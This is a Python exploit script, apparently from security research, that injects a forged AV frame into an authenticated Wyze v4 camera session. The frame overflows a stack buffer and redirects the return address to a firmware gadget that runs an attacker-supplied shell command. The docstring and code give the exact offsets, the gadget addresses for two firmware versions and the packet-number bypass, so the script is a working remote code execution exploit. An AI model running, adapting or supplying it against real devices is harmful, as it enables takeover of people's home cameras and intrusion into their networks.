#!/usr/bin/env python3
"""Inject one AV frame into a Wyze v4 K-channel session (CVE-2026-38698 harness).

The record layout is the one `_doAVTransNew` actually reads, not the one the
client parser assumes:

    [0] channel | [1] frame type | [8..28] 20-byte AV header | [28..] payload
    header: [4..6] frag count, [6..8] header skip, [8..10] declared,
            [12..16] packet number, [16..20] frame number

The header is copied from a record the camera just emitted, so channel, type and
the unused words stay real. Only the fields above are rewritten. The packet
number is gated: the parser drops any packet whose number is not strictly ahead
of the stored one (`compareUint32`, gate at `0x68e84c` in 4.52.17.32), so a
monotonic value is used.

The payload is 0x41 fill with the return address at `--ra-off` (default 1332 =
saved `ra`, buffer `0x534`) and the command at `--cmd-off` (default 1360 =
`sp+0x18` after the `addiu sp,sp,0x560` epilogue, buffer `0x550`).

  wyze_av_inject.py --uid U --enr E --mac M --cmd 'killall iCamera' \
      --ra 0x4747F0 [--declared 1500] [--ip 192.168.4.24]

Gadgets: 4.52.17.32 `0x4747F0`, 4.52.17.26 `0x484E2C`
(`move a1,zero ; jal exec_shell_sync ; addiu a0,sp,0x18`).
"""
import argparse
import os
import struct
import sys
import time

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
import wyze_ioctl_client as W  # noqa: E402


def main() -> int:
    ap = argparse.ArgumentParser()
    ap.add_argument("--ip", default="192.168.4.24")
    ap.add_argument("--uid", required=True)
    ap.add_argument("--enr", required=True)
    ap.add_argument("--mac", required=True)
    ap.add_argument("--cmd", default="")
    ap.add_argument("--ra", type=lambda s: int(s, 0), default=0x4747F0)
    ap.add_argument("--ra-off", type=lambda s: int(s, 0), default=1332)
    ap.add_argument("--cmd-off", type=lambda s: int(s, 0), default=1360)
    ap.add_argument("--declared", type=lambda s: int(s, 0), default=1500)
    ap.add_argument("--channel", type=lambda s: int(s, 0), default=7)
    ap.add_argument("--comb", type=int, default=0, help="also plant the command every N bytes")
    ap.add_argument("--comb-start", type=int, default=0)
    ap.add_argument("--repeat", type=int, default=1, help="send the frame N times")
    ap.add_argument("--dry", action="store_true")
    a = ap.parse_args()

    cmd = a.cmd.encode()
    if cmd and a.cmd_off + len(cmd) + 1 > a.declared:
        print(f"command {len(cmd)}B does not fit at {a.cmd_off} in {a.declared}B")
        return 2

    cam = W.Cam(a.ip, a.mac, a.uid, a.enr)
    cam.full_login()

    # one live record as the header template
    tmpl = None
    end = time.time() + 5
    while time.time() < end and tmpl is None:
        q = cam.recv_dtls(0.5)
        if not q:
            continue
        if q[0] != 23:
            continue
        ln = int.from_bytes(q[11:13], "big")
        d = cam.decrypt(23, int.from_bytes(q[5:11], "big"), q[13:13 + ln])
        if len(d) > 28 and d[0] == a.channel and d[1] in (0x00, 0x01, 0x04, 0x05):
            tmpl = d
    if tmpl is None:
        print("no template packet")
        return 1

    # fixed header (rootcmd's proven shape); the template only supplies the channel
    hdr = bytearray(28)
    hdr[0] = a.channel
    hdr[1] = tmpl[1] if tmpl[1] in (0x00, 0x01, 0x04, 0x05) else 0x01
    struct.pack_into("<H", hdr, 2, 0)
    n = int(time.time()) & 0x7FFFFFFF
    struct.pack_into("<H", hdr, 8, struct.unpack_from("<H", tmpl, 8)[0])  # live tx
    struct.pack_into("<H", hdr, 12, 1)          # frag count
    struct.pack_into("<H", hdr, 14, 0)          # header skip
    struct.pack_into("<H", hdr, 16, a.declared)
    struct.pack_into("<I", hdr, 20, 0)          # packet number (rootcmd leaves it 0)
    struct.pack_into("<I", hdr, 24, n)          # frame number
    pl = bytearray(b"\x41" * a.declared)
    pl[a.ra_off:a.ra_off + 4] = struct.pack("<I", a.ra)
    if cmd:
        offs = range(a.comb_start, a.declared - len(cmd) - 1, a.comb) if a.comb else (a.cmd_off,)
        for off in offs:
            if a.ra_off <= off < a.ra_off + 4:
                continue
            pl[off:off + len(cmd) + 1] = cmd + b"\x00"
    print(f"frame {28 + a.declared}B declared {a.declared} ra=0x{a.ra:08x} cmd={a.cmd!r}")
    if a.dry:
        return 0
    for i in range(a.repeat):
        struct.pack_into("<I", hdr, 20, i)
        struct.pack_into("<I", hdr, 24, n + i)
        cam.send(cam.encrypt(23, bytes(hdr) + bytes(pl)))
        print(f"sent {i + 1}/{a.repeat}")
        time.sleep(0.3)
    time.sleep(1)
    return 0


if __name__ == "__main__":
    sys.exit(main())
